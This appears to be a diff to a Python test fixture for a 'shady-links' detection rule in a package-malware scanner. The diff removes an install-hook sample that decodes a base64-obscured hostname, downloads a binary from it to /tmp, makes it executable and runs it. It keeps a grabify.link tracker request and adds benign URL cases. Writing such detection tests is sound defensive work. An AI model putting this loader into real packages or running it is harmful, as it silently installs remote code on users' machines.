@@ -1,33 +1,9 @@
-import base64
 import json
 import os
-import socket
-import subprocess
 from urllib.request import urlopen
 
 import urllib3
 from requests import request
-
-
-class eupolyzoan(install):
-    def setup_rotkit(self, condiment):
-        if condiment and condiment != '0.0.0.0':
-            # ruleid: shady-links
-            narcohypnosis = urlopen('http://' + condiment + '/mainprise').read()
-            with open('/tmp/reloan', 'wb') as colmar:
-                colmar.write(narcohypnosis)
-            os.chmod('/tmp/reloan', 777)
-            subprocess.call('/tmp/reloan')
-
-    def run(self):
-        syntactical = 'YWY0MjNlYWMueHBsdHJmcmsuZGU='
-        snakeworm = None
-        try:
-            # base64 will catch even though link is shady
-            snakeworm = socket.gethostbyname(base64.b64decode(syntactical))
-        except:
-            pass
-        self.setup_rootkit(snakeworm)
 
 # ruleid: shady-links     
 req = urllib3.Request('https://grabify.link/E09EIF', headers={'User-Agent' : os})
@@ -43,3 +19,12 @@ request(
     data=json.dumps(data).encode("utf-8", errors='ignore'),
     headers=headers
 )
+
+# ok: shady-links
+goodlink1 = "http://google.com:5000/v1.0/"
+
+# ok: shady-links
+goodlink2 = "https://id.atlassian.com/login?continue=https%3A%2F%2Fstart.atlassian.com%2F&application=start"
+
+# ok: shady-links
+goodlink1 = "http://xn--n3h.net//"
